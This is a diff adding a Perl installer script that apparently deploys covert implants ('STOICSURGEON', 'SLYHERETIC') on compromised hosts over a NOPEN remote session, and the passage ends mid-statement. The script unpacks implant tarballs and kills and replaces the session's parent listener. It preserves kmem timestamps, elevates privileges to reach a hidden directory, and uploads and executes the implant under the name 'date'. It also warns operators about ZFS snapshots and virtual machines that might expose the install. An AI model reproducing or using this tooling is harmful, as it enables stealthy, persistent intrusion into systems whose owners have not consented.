@@ -1,0 +1,1185 @@
+#!/usr/bin/env perl
+##
+
+# TODO: -gs install -s SOMETHING(standalone mode install SOMETHING)
+
+use File::Basename ;
+$VER="1.3.0.15";
+
+$| = 1 ;
+my $tarball="";
+my ($installoutput,$errcode,$errstring,$success) = ();
+my ($allcontent,$allwarning) = ();
+$versionfile = "";
+
+myinit() ;
+$tarball = "NULL" if $deinstallonly;
+if ($ARGV[0]) {
+  $warning = "$ARGV[0] does not exist\n\n" if
+    ($tarball ne "NULL" and
+     ($ARGV[0] =~ /\// or ! ($ARGV[0] =~ /=/))
+    );
+}
+unless ($logonly) {
+  unless ($deinstallonly) {
+    while (!$tarball) {
+      my @rest=();
+      @rest = ("none") if @ARGV;
+      $tarball = mygetinput("${warning}What tarball (or ABORT)?",@rest);
+      if (lc $tarball eq "none") {
+	$tarball = "";
+	last;
+      }
+      mydie("User aborted") if $tarball =~ /^a/i;
+      unless (!$tarball or -f $tarball) {
+	mywarn("$tarball: File does not exist");
+	$tarball = "";
+      }
+    }
+  }
+}
+
+my ($newhostinfocontent,$extrahostinfocontent,
+    %newhostinfocontentfile,%extrahostinfocontentfile) = ();
+my ($clientver,$histfile,$cmdoutfile,$localcwd,$nhome,$localpid,$localppid,
+    $serverver,$wdir,$targetos,$targetcwd,$targetpid,$targetppid,$targetport)
+  = parsestatus("force");
+
+
+my $stoicinstalldir = "/tmp";
+$stoicinstalldir = $host_nonhiddenworkingdir if $host_nonhiddenworkingdir;
+unless ($logonly or $targetcwd eq $stoicinstalldir) {
+  my ($ans) = mygetinput("Your working directory is not $stoicinstalldir.\n".
+			 "Do you want to -cd to $stoicinstalldir first?","Y");
+  if ($ans eq "y") {
+    my ($output,$nopenlines,@output)
+      = doit("-cd $stoicinstalldir");
+    mydie("Up-arrow and run it again now that you are in $stoicinstalldir");
+  } else {
+    newhostvar("host_workingdir",$targetcwd);
+    newhostvar("host_nonhiddenworkingdir",$targetcwd);
+  }
+}
+
+if ($dotpath) {
+  my ($newpath) = grep /PATH=/,nopenaddpath(".");
+  mydie("This  is bad, our PATH should start with $targetcwd and instead it is: PATH=$newpath")
+    unless ($newpath =~ m,^PATH=$targetcwd:,);
+}
+
+my $hostfile = "$opdown/hostinfo.$nopen_rhostname";
+if (! -f $hostfile and -f "$hostfile.0000") {
+  my @list = split(/\n/,`ls -rt1 $hostfile*`);
+  rename($list[$#list],$hostfile);
+}
+
+offerabort
+  ("Normally, NOPEN should have run autodone by this time and\n\n".
+   "      $hostfile\n\n".
+   "would exist by now. You can abort now and run:\n\n".
+   "      -gs auto new\n\n".
+   "if you want a complete hostinfo file for $prog to append to.\n\n".
+   "If you continue, $prog will create a partial hostinfo file."
+  ) unless -s $hostfile;
+
+my $count = 0;
+$count++ while -e "$optmp/${nopen_rhostname}.install.$count";
+$count-- if ($logsuccess or $logfailure);
+my $installdir = "$optmp/${nopen_rhostname}.install.$count";
+if ($deinstallonly and ! -s $tarball) {
+  $installdir = "$opdir";
+} else {
+  unless (-d $installdir) {
+    mkdir $installdir or mydie("Could not create $installdir");
+  }
+  chdir $installdir or mydie("Could not cd to $installdir");
+}
+
+# This part is only when we have a tarball
+dbg("Calling:  handle($tarball) if tarball=$tarball or logonly=$logonly;");
+my $progress = handle($tarball) if ($tarball or $logonly);
+
+## END MAIN ##
+
+sub findversionfile {
+  local ($dir,$matchstring,$optional) = (@_);
+  # Returns content of only file in $dir matching $matchstring, which defaults to etc.version
+  # (match is case insensitive). Unless $optional is set, the file must be there or we mydie().
+
+  return "" unless ($dir and -d $dir);
+  $matchstring = "etc.version" unless $matchstring;
+  my @lines = split(/\n/,`cd $dir 2>/dev/null && find . 2>/dev/null | grep -i "$matchstring" 2>/dev/null`);
+  return "$dir/$lines[0]" if (@lines == 1 and -s "$dir/$lines[0]" > 0);
+  my $what = "has more than one";
+  $what = "has an empty" if (@lines == 1);
+  mydie(`cd $dir  2>&1 && find . -ls 2>&1 | grep -i etc.version`."\n".
+	"Your tarball, unpacked in $dir, $what\n".
+	"version file. Fix that and try again.")
+      unless $optional;
+}
+# findversionfile
+
+sub handle {
+  local ($targetball) = (@_);
+  my $baseball = basename $targetball;
+#  dbg("In handle(@_)");
+  my %toolindex = (); # key=0-N index value=toolname
+  my $output;
+  if (!$logonly or $logfailureball or $logsuccessball) {
+    mydie("Could not properly untar $tarball:\n".`cat $installdir/tar.$baseball.err`) unless
+      `tar xvjf $targetball 2>$installdir/tar.$baseball.err` or
+	$targetball eq "NULL";
+    $versionfile = findversionfile($installdir);
+    $slipperyscalpelconfigfile =  findversionfile($installdir,"slipperyscalpel.config",1);
+    progprint($COLOR_NORMAL."\n\n\n".
+	      "Just unpacked in $installdir:\n\n".
+	      `cd $installdir ; find . -name tar.$baseball.err -prune -o -type f -ls | sed "s/.*  root //g"`.
+	      "\n\ncat $versionfile\n".
+	      `cat $versionfile 2>/dev/null`);
+    $logsuccess = $logsuccessball if  $logsuccessball;
+    $logfailure = $logfailureball if  $logfailureball;
+  }
+  my @versions = readfile("ARRAY","$versionfile");
+  my ($stoicver) = grep /STOICSURGEON/i, @versions;
+  $stoicver =~ s,.*STOICSURGEON.*v,,i;
+  $stoicver =~ s,\s,,g;
+  
+  my ($slyver) = grep /SLYHERETIC/i, @versions;
+  $slyver =~ s,.*SLYHERETIC.*v,,i;
+  $slyver =~ s,\s,,g;
+
+  my $zfsnotok = ((verval($stoicver))[1] < (verval("1.7.0.0"))[1]) ? 1 : 0;
+  my $zfssnapshot = 0;
+  my @savepids = ($targetpid);
+  unless ($logonly) {
+    if ($targetppid > 1) {
+      my ($ans) = mygetinput
+	("You are connected to a listener on port $targetport with pid $targetppid.\n\n".
+	 "You must orphan yourself from that parent, which $prog will do\n".
+	 "for you if you <C>ontinue (i.e., it will kill your parent PID then start a\n".
+	 "fresh listener).\n\n".
+	 "How do you want to proceed (ORPHAN,ABORT)?",
+	 "ORPHAN","A",ABORT,);
+      mydie("User aborted") if $ans eq "a";
+      if ($ans eq "o") {
+	doit("kill -9 $targetppid");
+	my ($listenoutput) = doit("-listen $targetport",);
+	unless ($skipctrl) {
+	  my ($newpid) = $listenoutput =~ /noclient: server successfully forked new process at PID (\d+)/;
+	  # we -ctrl -k this new listener
+	  if ($newpid > 1) {
+	    `echo "$nopen_rhostname: $newpid ($newpid)" >> $opdown/pid`;
+	    my @opts = ("-k","$newpid");
+	    push(@opts,$seedopt) if $seedopt;
+	    push(@opts,$dopause) if $dopause;
+	    dbg("Calling stoicctrl(@opts);");
+	    stoicctrl(@opts);
+	  }
+	}
+	($clientver,$histfile,$cmdoutfile,$localcwd,$nhome,$localpid,$localppid,
+	 $serverver,$wdir,$targetos,$targetcwd,$targetpid,$targetppid,$targetport)
+	  = parsestatus("force");
+	mydie("Parent PID ($targetppid) not 1 after killing parent.\n\n".
+	      "Big Twinkie Bad here....")
+	  unless ($targetppid eq $initpid);
+	sleep 2;
+#ELSE WAS the CONTINUE case, now deprecated
+#      } else {
+#	push @savepids,$targetppid;
+      }
+    }
+    if ($solaristarget) {
+      my ($output) = myfiletimesave("/devices/pseudo/mm\@0:kmem");
+      offerabort("OUTPUT=$output=\n".
+		 "Something appears to be wrong. $prog just tried to save the\n".
+		 "existing timestamps of /devices/pseudo/mm\@0:kmem with -ls -n,\n".
+		 "but the myfiletimesave(\"/devices/pseudo/mm\@0:kmem\") call just\n".
+		 "executed did not return the expected output. Abort and get help\n".
+		 "unless you're directed to continue","A")
+	unless ($output);
+      my $incisiondir = "/platform/SUNW,SystemEngine";
+      $incisiondir = "/platform/dvri86pc"
+	if $inteltarget;
+      # FOR TESTING, uncomment next two lines:
+      #doit("mkdir /var/tmp/kilroy;rmdir /var/tmp/kilroy");
+      #$incisiondir = "/var/tmp/kilroy";
+      my $parentdir = dirname($incisiondir);
+      my $regexp = basename($incisiondir);
+      ($output,$nopenlines,@output)
+	= doit("-strings $parentdir");
+      if (grep /^$regexp$/ ,@output) {
+	offerabort
+	  ("$COLOR_FAILURE\n\n".
+	   "You must investigate this. The above -strings command matched\n".
+	   "$incisiondir so we may have had INCISION on here once.\n".
+	   "\n".
+	   "You should only continue if you know it is safe to install over top\n".
+	   "of whatever is there (say, perhaps, INCISION is gone and we know it is).",
+	   "ABORT",
+	  );
+      }
+    }
+  }
+
+  my (@datefiles) = findfilematching("date","f","$installdir/up");
+  my ($datefile,$datefile2) = (@datefiles);
+  $ctrlfile = "$installdir/up/Stoicsurgeon-Ctrl";
+  $ctrlfile = "" if $skipctrl;
+
+  if ($stoicver) {	
+    mydie("$prog only knows how to handle STOICSURGEON tarballs with both\n\t".
+	    "up/date and up/Stoicsurgeon-Ctrl in them")
+      unless ($tarball eq "NULL" or
+	      (-f $datefile and (-e $ctrlfile or $skipctrl)) or
+	     ($logsuccessball or $logfailureball));
+  } elsif ($slyver) {
+    mydie("$prog only knows how to handle SLYHERETIC tarballs with two\n\t".
+            "up/date* packages and Slyheretic_Check* files:\n\n".
+            `cd $installdir ; find . -type f -ls | sed "s,.* root ,,g"`
+	  ) unless ($tarball eq "NULL" or
+		@datefiles == 2 or
+              (-f $datefile and (-e $ctrlfile or $skipctrl)) or
+             ($logsuccessball or $logfailureball));
+  } else {
+    mydie("$prog\n\n".
+	  "There are not any valid installable tools in that file:\n".
+	  "$COLOR_NORMAL\n".
+            `cd $installdir ; find . -type f -ls | sed "s,.* root ,,g"`
+	 )
+      #unless ();
+  }
+
+  my $problems = "";
+  unless ($deinstallonly) {
+    $versionfile =  findversionfile($installdir);
+    unless ($logonly) {
+      my ($output,$nopenlines,@output) = doit("=df");
+      if ($zfsnotok and my @bad = grep m,^/*rpool.*\s+/$, , fixdf(@output)) {
+	offerabort
+	  ($COLOR_FAILURE."\n\nTAKE NOTE!!!\n$COLOR_NOTE\n\n ".
+	   join("\n  ",@bad2)."\n$COLOR_NORMAL\n".
+	   "The =df above contains \"rpool\" for the / partition. This usually\n".
+	   "indicates that the target is using zfs. An install here would likely\n".
+	   "SUCCEED, however you$COLOR_FAILURE MUST NOT$COLOR_NORMAL do so. Proceed here at\n".
+	   "your own risk.","A");
+	offerabort
+	  ($COLOR_FAILURE."\n\nSERIOUSLY!!!\n$COLOR_NORMAL\n".
+	   "Are you sure?  If it goes bad, this will be your problem, not mine.","A");
+	mywarn("OK. I suppose you think you know what you're doing.\n".
+	       "I'm crossing my fingers for you!! Good luck.\n".
+	       "Proceeding in 5...");
+	sleep 5;
+      }
+      if ($solaristarget) {
+	($output) = doit("-ls /.zfs/snapshot");
+	#my ($output2,$nopenlines,@output2) = 
+	  #nopenlss("-dUg/.tmp","/.zfs/snapshot/*/var/spool/.* /.zfs/snapshot/*/var/log/.* /.zfs/snapshot/*/lib/.* /.zfs/snapshot/*/dev/.* /.zfs/snapshot/*/etc/.* /.zfs/snapshot/*/.* /.zfs/snapshot/*/var/tmp/.*");
+	if ($output) {
+	  $zfssnapshot = $output;
+	  offerabort
+            (#"output2==\n$output2\n==\n".
+		$COLOR_FAILURE."\n\nTAKE NOTE!!!\n$COLOR_NOTE\n".
+		"$COLOR_NORMAL\n".
+       		"If you proceed with an install, files in STOICs directory $COLOR_FAILURE WILL BE$COLOR_NORMAL\n".
+		"visible in any subsequent /.zfs/snapshot/ partitions that are made. \n".
+		"See the ZFS guidance, then proceed as appropriate.\n\n","A");
+
+	}
+      }
+    }
+
+    # Old script put individual files per implant in ./up/. If
+    # we do not have the etc/VERSION file use that instead.
+    $versionfile = "$installdir/up/.*VERSION" unless -s $versionfile;
+    if (my $slipperyconfig = readfile($slipperyscalpelconfigfile)) {
+	offerabort("This build comes with a $slipperyscalpelconfigfile\n".
+		   "file with the following contents:\n".
+		   "==== BEGIN SLIPPERY config on $nopen_rhostname ===\n".
+		   $slipperyconfig.
+		   "====  END  SLIPPERY config on $nopen_rhostname ===\n\n".
+		   "Save this in your opnotes.txt.".
+		   "");
+    }
+    my ($installedtools,$nopenlines,@output)
+      = doit("-lsh cat $versionfile");
+    my ($solaristoolversion,
+	$linuxtoolplatform,
+	$solaristoolplatform,
+	$freebsdtoolplatform,
+	$inteltoolplatform,
+	$sparctoolplatform,
+	$toolcomment,@comment,
+	$toolversion,
+	$sbguid,
+       ) = ();
+    if (my ($tmpsbguid) = grep /straitbizarre/i , @output) {
+	$tmpsbguid =~ s,-,,g;
+	($sbguid) = $tmpsbguid =~ /([a-f0-9]{32})/;
+    }
+    if (!$sbguid) {
+	$tmpsbguid = $targetball;
+	$tmpsbguid =~ s,-,,g;
+	($sbguid) = $tmpsbguid =~ /([a-f0-9]{32})/;
+    }
+    
+    foreach (@output) {
+      next if /None vNone/;
+      s/\s/ /g;
+      if (-e "$installdir/etc/VERSION") {
+	($tool,$toolplatform,$toolversion,@comment) = split;
+      } else {
+	($tool,$toolversion,$toolplatform,@comment) = split;
+      }
+      $toolcomment = join(" ",@comment);
+      $linuxtoolplatform = $1 if
+	$toolplatform =~ /(\S*linux\S*)/i;
+
+      # SOLARIS
+      $solaristoolplatform = $1 if
+	$toolplatform =~ /(\S*(sunos|solaris)\S*)/i;
+      if ($solaristoolplatform =~ /([\d\.]+)$/) {
+	$solaristoolversion = $1;
+      }
+
+      # JUNOS
+      $junostoolplatform = $1 if
+	$toolplatform =~ /(\S*junos\S*)/i;
+      if ($junostoolplatform =~ /([\d\.]+)$/) {
+	$junostoolversion = $1;
+      }
+
+      # FREEBSD
+      $freebsdtoolplatform = $1 if
+	$toolplatform =~ /(\S*(freebsd)\S*)/i;
+      if ($freebsdtoolplatform =~ /([\d\.]+)$/) {
+	$freebsdtoolversion = $1;
+      }
+
+      # HARDWARE
+      $inteltoolplatform = $1 if
+	$toolplatform =~ /(\S*[i3456x]+86\S*)/;
+      $sparctoolplatform = $1 if
+	$toolplatform =~ /(\S*(sparc|sun4[umc])\S*)/;
+      
+      my $sure = 0;
+      $problems .= "   Mismatch on: $tool $toolversion $toolplatform\n"
+	if (($linuxtarget and !$linuxtoolplatform) or
+	    ($solaristarget and !$solaristoolplatform) or
+	    ($freebsdtarget and !$freebsdtoolplatform) or
+	    ($junostarget and !$junostoolplatform) or
+	    ($inteltarget and !$inteltoolplatform) or
+	    ($sparctarget and !$sparctoolplatform) or
+	    ($freebsdtoolplatform and $freebsdtargetversion
+	     and ($freebsdtargetversion !~ /$freebsdtoolversion/)) or
+	    ($solaristoolversion and $solaristargetversion
+	     and $solaristoolversion ne $solaristargetversion) or
+	    ($junostoolversion and $junostargetversion
+	     and $junostoolversion ne $junostargetversion)
+	   );
+      $toolversion =~ s/^v(ersion|\s)*//;
+      dbg("INSIDE:$_
+  linuxtarget=$linuxtarget
+  solaristarget=$solaristarget   solaristargetversion=$solaristargetversion
+  solaristoolversion=$solaristoolversion   solaristargetversion=$solaristargetversion
+  inteltarget=$inteltarget
+  sparctarget=$sparctarget
+  linuxtoolplatform=$linuxtoolplatform
+  solaristoolplatform=$solaristoolplatform
+  inteltoolplatform=$inteltoolplatform
+  sparctoolplatform=$sparctoolplatform
+
+  freebsdtarget=$freebsdtarget=
+  freebsdtoolplatform=$freebsdtoolplatform
+  freebsdtargetversion=$freebsdtargetversion
+  freebsdtoolversion=$freebsdtoolversion
+
+
+  problems=$problems==
+");
+      push @tools,$tool;
+      $toolindex[$tool] = scalar @tools - 1;
+      $toolindex["SLIPPERYSCALPEL"] = @tools - 1
+	if ($tools[$i] =~ /SLIPPERYSCALPEL/i);
+      push @versions,$toolversion;
+      push @toolplatforms,$toolplatform;
+      push @comments,$toolcomment;
+    }
+    if (-f $slipperyscalpelconfigfile and
+	defined $comments[$toolindex["SLIPPERYSCALPEL"]]) {
+      my ($content) = doit("-lsh cat $slipperyscalpelconfigfile | sed \"s/^/\#/g\"");
+      chomp($content);
+      $content =~ s,[\r\n],::,g;
+      $content =~ s,[\#],: ,g;
+      $comments[$toolindex["SLIPPERYSCALPEL"]] .= " INSTALLED WITH CONFIG$content";
+    }
+  }
+  dbg("
+  linuxtarget=$linuxtarget
+  solaristarget=$solaristarget
+  inteltarget=$inteltarget
+  sparctarget=$sparctarget
+  linuxtoolplatform=$linuxtoolplatform
+  solaristoolplatform=$solaristoolplatform
+  inteltoolplatform=$inteltoolplatform
+  sparctoolplatform=$sparctoolplatform
+  problems=$problems=
+");
+  # TODO: Maybe take all non-stoic possibility out of here?
+  my $stoicinstall = "@tools" =~ /stoicsurgeon/i;
+  my $slyinstall = "@tools" =~ /slyheretic/i;
+  $stoicinstall++ if $deinstallonly;
+  if ($problems) {
+    my $more = "\n(OS version mismatch: $solaristoolversion ne $solaristargetversion)"
+      if $solaristoolversion ne $solaristargetversion;
+    offerabort
+      ($COLOR_FAILURE.$problems."\n\n".
+       "WE HAVE A PROBLEM HERE.\n$COLOR_NORMAL\n".
+       "Target OS: $nopen_serverinfo\n\n".
+       "Target OS does not match one or more tool platforms.\n\n".
+       "There appears to a conflict here.".$more,
+       "A"
+      );
+    offerabort
+      ($COLOR_FAILURE."ARE YOU SURE?");
+  }
+  my (undef,undef,@problems) = doit("cat /proc/scsi/scsi");
+  my (undef,undef,@problems2) = doit("cat /proc/cpuinfo");
+  if (grep /(Msft|Virtual Disk)/ , @problems,@problems2) {
+      my $nother = $problems ? "NOTHER" : "";
+        offerabort
+      ($COLOR_FAILURE."\n\n".
+       "WE HAVE A$nother PROBLEM HERE.\n$COLOR_NORMAL\n".
+       "The target's /proc/cpuinfo or /proc/scsi/scsi matches either \"Msft\" or\n".
+	"\"Virtual Disk\".\n\n".
+       "STOICSURGEON is known to have serious issues in this environment. Continue\n".
+       "only if you consult experts (someone else) and are recommended to do so.",
+	"A");
+	my $warn = "";
+	while (1) {
+	  my ($ans,$longans) = mygetinput
+	    ($COLOR_FAILURE.$warn.$COLOR_NORMAL."\n\n".
+	     "You must get an expert/second opinion to continue.\n".
+	     "What is that USERID (or you can <A>bort)? ");
+  	  mydie("User aborted") if ($ans eq "a");
+	  $warn = "\nINVALID INPUT TRY AGAIN:";
+	  if ($gbl_opuser =~ /$longans/) {
+		$longans = "";
+		$warn = "\nMUST NOT BE A CURRENT OPERATOR, TRY AGAIN:";
+	  }
+	  $longans = int($longans);
+	  last if ($longans > 9999 and $longans < 100000);
+	}
+	mydo("autoproblem","-O$longans","Second added to allow install despite match to 'Msft' or 'Virtual Disk'.");
+	progprint("NOTE: Be sure to use those pastables\n(not in INSERT mode) in your OP DETAILS.");
+  }  
+
+  $remotename = "date" unless $remotename;
+  my $domore = " ; echo $?" unless $remotename eq "date";
+  while (!$deinstallonly and !$logonly) {
+    my ($remoteexists,$nopenlines,@output)
+      = doit("-ls $workdir/$remotename");
+    if ($remoteexists) {
+      my ($ans,$newname) = mygetinput
+	("Remote file \"$remotename\" already exists. If you CONTINUE,\n".
+	 "you will have to answer \"YES\" to overwrite that file,$COLOR_FAILURE\n".
+	 "AND THAT FILE DOES NOT APPEAR TO BE OURS!\n$COLOR_NORMAL\n".
+	 "If you enter some other name, $prog will try to use that.\n\n".
+	 "Enter \"CONTINUE\" or \"$remotename\" to continue with the name ".
+	 "\"$remotename\",\"ABORT\" to abort, or enter the new name to use: \n",
+	 "CONTINUE"
+	);
+      mydie("User aborted")
+	if ($newname =~ /^a(bort){0,1}$/i);
+      last if $newname eq "CONTINUE";
+      $remotename = $newname;
+    } else {
+      last;
+    }
+  }
+  my ($hiddendir,$safehiddendir) = ();
+  my $morecheck = "";
+  unless ($logonly) {
+    my $solarismore = "";
+    $solarismore = "and also save\nthe initial mtime/atimes of /devices/pseudo/mm\@0:kmem."
+      unless ($host_touchkmem or !$solaristarget);
+
+
+
+
+    offerabort
+      ("Looks like the target matches the tarball.\n\n".
+       "About to upload and execute $datefile$solarismore. Last chance to bail.")
+	unless $tarball eq "NULL" or $deinstallonly;
+    my ($dev,$ino,$mode,$nlink,$uid,$gid,$rdev,$size,
+	$atime,$mtime,$ctime,$blksize,$blocks)
+      = stat($datefile);
+    if ($stoicinstall) {
+      # If no previous use of stoic set this, we do so now from $installdir
+      unless($stoicctrlfile or $skipctrl) {
+#dbg("Calling mystoicctrl(,$ctrlfile);");
+	mystoicctrl(noprompt,$ctrlfile);
+      }
+      my ($priorhiddendir,$priorsafehiddendir,@prioroutput) = gethiddendir(force);
+      my $alreadyinstalled = "";
+      @errs = ();
+      unless ($skipctrl) {
+	my @opts = ("-ACE$workdiropt");
+	push(@opts,$seedopt) if $seedopt;
+	push(@opts,$dopause) if $dopause;
+	stoicctrl(@opts);
+	($hiddendir,$safehiddendir,@output) = gethiddendir();
+	$alreadyinstalled = !@errs;
+      }
+dbg("hiddendir=$hiddendir=
+priorhiddendir=$priorhiddendir=");
+      if ($skipctrl and $hiddendir) {
+	offerabort
+	  ("You are skipping use of Ctrl entirely, yet there is already a hidden\n".
+	   "directory. This means your install will proceed anyway, and if the hidden\n".
+	   "directory there is a valid install, it will self-destruct as a side effect\n".
+	   "of this install, destroying any contents in that hidden directory.");
+      }
+      if ($alreadyinstalled) {
+	if (!$hiddendir) {
+	  my $usedto = "$COLOR_FAILURE (AND YOU USED TO!)"
+	    if $priorhiddendir;
+	  offerabort("This is odd. The above -E and -C Ctrl commands returned no error, (meaning\n".
+		     "they worked) yet you do not have a hidden directory visible$usedto.");
+	} elsif (!$priorhiddendir) {
+	  offerabort("OK, so it looks as if you were NOT priveleged until just now.\n".
+		     "You should see the above -ls PRIOR to elevation (-E/-C) did NOT show\n".
+		     "the hidden directory, and the one after does.\n\n".
+		     "You can abort now (and figure things out) or\n".
+		     "(if maybe you expected this) continue with the install. If you continue,\n".
+		     "you will have options about what to do with the new install.");
+	} elsif ($priorhiddendir ne $hiddendir) {
+	  #gethiddendir(force,recurse);
+	  # REMOVE THE RECURSE THAT IS BAD WITH /
+	  gethiddendir(force);
+	  offerabort("${COLOR_FAILURE}This is VERY odd$COLOR_NORMAL. You had two different hidden directories, before and after\n".
+		     "the above -E/-C elevation. The above -E and -C Ctrl commands returned no error,\n".
+		     "so they seemed to work, yet your hidden directory is now different???\n\n".
+		     "See above recursive -ls of all possible hidden directories if that helps.");
+	}
+	# Other case, where $hiddendir AND priorhiddendir is fine unless they are not the same
+      }
+      my $dowhat = "";
+
+      #mydie("output=$output= alreadyinstalled=$alreadyinstalled=");
+      if ($alreadyinstalled) {
+	my ($prompt,$default) = 
+	  ("It seems STOICSURGEON is already there (\"-ctrl -EC\" above WORKED).\n\n".
+	   "You have four options (you may answer just the first letter):\n\n".
+	   " DEINSTALL: Use -ctrl -U to completely DEINSTALL previous STOIC.\n".
+	   "            This will wipe all content in the hidden dir also.\n".
+	   " UNPATCH  : Use -ctrl -n to invoke a partial uninstall (unpatch \n".
+	   "            and unload). This removes the software, leaving the hidden\n".
+	   "            directory to be re-used by the install to follow.\n".
+	   " CONTINUE : Continue with the install without ANY uninstall of the previous\n".
+	   "            STOIC. The old stoic should detect the new one being installed\n".
+	   "            and self-destruct before allowing the new one to be installed.\n".
+	   " ABORT    : Abort and return to your NOPEN prompt\n\n".
+	   "It is recommended that you DEINSTALL the previous copy first, your default\n".
+	   "option. If proceeding with any install option, $prog will first preserve\n".
+	   "this NOPEN window and any non-init parent pid from being killed by the\n".
+	   "uninstall (using -ctrl -k).\n".
+	   "\n".
+	   "Your choices are DEINSTALL, UNPATCH, CONTINUE and ABORT. Choose:",
+	   "DEINSTALL"
+	  );
+	($prompt,$default) = 
+	  ("Confirmed previous installation of STOICSURGEON is still active.\n".
+	   "Last chance to bail before DEINSTALL proceeds.".
+	   "\n\n<C>ontinue or <A>bort.","CONTINUE"
+	  ) if $deinstallonly;
+	my ($ans,$myans) = mygetinput($prompt,$default);
+	my $elevateerr = "";
+	if ($ans eq "a") {
+	  rmctrl(force);
+	  mymydie("User aborted");
+	}
+	($ans,$myans) = ("d","DEINSTALL") if $deinstallonly;
+#	dbg("myans=$myans");
+	# TODO: If -ctrl fails, upload and use
+	# /current/install.##/up/Stoicsurgeon-Ctrl instead
+	stoicctrl("-Azk$workdiropt",$dopause,@savepids);
+	my $preuninstallhiddendir = $hiddendir;
+	mydie("-ctrk -k @savepids : FAILED")
+	  if (@errs);
+dbg("Before errs=(@errs) nonerrs=(@nonerrs)");
+
+# TODO:  Log the uninstalls properly with logtool()....need the old versions for that.
+
+
+	if ($ans eq "d" or $ans eq "u") {
+	  $dowhat = "DEINSTALL";
+	  if ($ans eq "d") {
+	    # TODO: stoicctrl would default to a $workdir of the hiddendir, so if
+	    # we did NOT have a $workdir before, we need it to be /tmp now,
+	    # in which case we have to rmctrl.
+	    stoicctrl("-AU$workdiropt",$dopause);
+dbg("errs=(@errs) nonerrs=(@nonerrs)
+
+completeoutput=(\n".join("\n",@completeoutput)."\n)
+
+");
+	  } elsif ($ans eq "u") {
+	    $dowhat = "UNPATCH";
+	    stoicctrl("-An$workdiropt",$dopause);
+	  }
+dbg("Now errs=(@errs) nonerrs=(@nonerrs)");
+	  if (@errs) {
+	    offerabort("$dowhat appeared to fail.");
+	  }
+#	  ($hiddendir,$safehiddendir,@output) = gethiddendir(force);
+	  # We just uninstalled, this is expected to fail
+	  stoicctrl("-zE$workdiropt",$dopause,$targetpid);
+	  $elevateerr = @errs;
+#	  dbg("After -E $targetpid:
+#errs=(@errs)
+#completeoutput=(@completeoutput)
+#elevateerr=$elevateerr=
+#");
+	  ($output,$nopenlines,@output)
+	    = doit("-ls $safehiddendir");
+#	  dbg("second time hiddendir=$hiddendir safehiddendir=$safehiddendir");
+	  my ($stillinstalled) = grep m,$preuninstallhiddendir, , @output;
+	  unless ($elevateerr and !$stillinstalled) {
+	    offerabort
+	      ($COLOR_FAILURE.
+	       "$dowhat appeared to fail" 
+	       #." yo elevateerr=$elevateerr= stillinstalled=$stillinstalled="
+	      );
+	  } else {
+	    if ($deinstallonly) {
+	      mydie("$dowhat appears successful. You are now UNCLOAKED/exposed.");
+	    }
+	    offerabort
+		("$dowhat appeared successful.\n".
+		 "About to upload and execute $datefile. Last chance to bail.");
+	  }
+	}
+      } else {
+	mymydie("STOICSURGEON does not appear to be there")
+	  if $deinstallonly;
+      }
+    }
+    rmctrl(force) unless $skipctrl;
+    if ($extracmd) {
+	($ans,$extracmd) = mygetinput
+	    ("You used the -p option: Enter the command or environment definition\n".
+	     "you want to run before running \"$remotename$domore\" (or enter nothing\n".
+	     "or enter ABORT to abort).\n\n".
+	     "Extra command: ");
+	mydie("User aborted")
+	    if ($extracmd =~ /^\s*abort/i);
+	$extracmd .= " " if (length $extracmd);
+    }
+    
+    ($output,$nopenlines,@output)
+      = doit("-put $datefile $workdir/$remotename");
+
+    mydie("\n\nUpload failed (wrong size or missing?), you have cleanup to do.")
+      unless ($output =~ m,-rwx------ .* $size .* $workdir/$remotename,);
+  
+    # ASSERT: $remotename is up there, executable and the right size.
+
+    if ($dopause) {
+      doit("-ls $workdir/$remotename");
+      offerabort("OK, here's the pause you asked for. Upload worked.\n\n".
+		 "If you abort here, $remotename will$COLOR_FAILURE STILL BE UP THERE!!");
+    }
+    doit("-cd $workdir") unless $targetcwd eq $workdir;
+    if ($dotpath) {
+      ($installoutput,$nopenlines,@output)
+	= doit("${extracmd}PATH=.:\$PATH $remotename$domore");
+    } else {
+      ($installoutput,$nopenlines,@output)
+	= doit("${extracmd}PATH=. $remotename$domore");
+    }
+    # CD back unless we did not cd, or we came from hidden dir.
+    doit("-cdp") unless ($targetcwd eq $workdir or
+			 $targetcwd =~ m,/\.[a-f0-9]{32}, or
+			 $targetcwd =~ m,/\.tmp[A-Za-z0-9_-]{6},);
+  }
+  $success = "SUCCESSFUL";
+  if ($logonly) {
+    $success = "FAILED" if $logfailure or $logfailureball;
+  } else {
+    ($errcode,$errstring) = $installoutput =~ / \d\d:\d\d:(\d\d)/;
+
+    unless ($errcode eq "00") {
+      $success = "FAILED";
+
+
+
+
+      my $stoicfile = "$opetc/user.tool.stoicsurgeon.COMMON";
+      $stoicfile = "$opetc/user.tool.stoicsurgeon"
+	unless -e $stoicfile;
+      my %errstrings=();
+      if (-e $stoicfile and open(STOIC,$stoicfile)) {
+	# This assumes TWO LINE entries in user.tool.stoicsurgeon.COMMON
+	# for all error codes, with a format matching 
+	my @stoiclines = <STOIC>;
+	close(STOIC);
+	my $lineone = "";
+	while (@stoiclines) {
+	  my $line = shift @stoiclines;
+	  next unless ($line =~ /^[ \#]+([0-9]+)/);
+	  my $num =int($1);
+	  $line =~ s/^[ \#\s]*//;
+	  if ($stoiclines[0] =~ /^\#\#\s*([A-Z].*)/) {
+	    chomp($line);
+	    $line .= shift(@stoiclines);
+	    $line =~ s/\#*[ \t]+/ /g;
+	    $line =~ s/\s+$//g;
+	    $line =~ s/[ \t]+/ /g;
+	  }
+	  $errstrings{$num}  = "\nTool Comments: FAILED: ERROR CODE $line";
+#	  $errstrings{$num} .= "Tool Comments:".<STOIC>;
+#	  $errstrings{$num} =~ s/\#*[ \t]+/ /g;
+#	  $errstrings{$num} =~ s/\s+$//g;
+#	  $errstrings{$num} =~ s/[ \t]+/ /g;
+	  dbg("Just set \$errstrings{$num}=$errstrings{$num}=");
+	}
+	last if (%errstrings and /^\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#/);
+      }
+
+      if ($errstrings{int $errcode}) {
+	$errstring = $errstrings{int $errcode};
+      } else {
+	$errstring = "UNKNOWN ERROR #: $errcode";
+      }
+    }
+  }
+  for (my $i=0;$i<@tools;$i++) {
+    my ($what1,$what2) = ("DEPLOYED","Installed");
+    ($what1,$what2) = ("EXERCISED","Exercised")
+      unless ($installtype eq "install");
+    ($what1,$what2) = ("ACCESSD","Accessd")
+      if ($installtype eq "access");
+    ($what1,$what2) = ("USED","Used")
+      if ($installtype eq "use");
+    ($what1,$what2) = ("REMOVED","Removed")
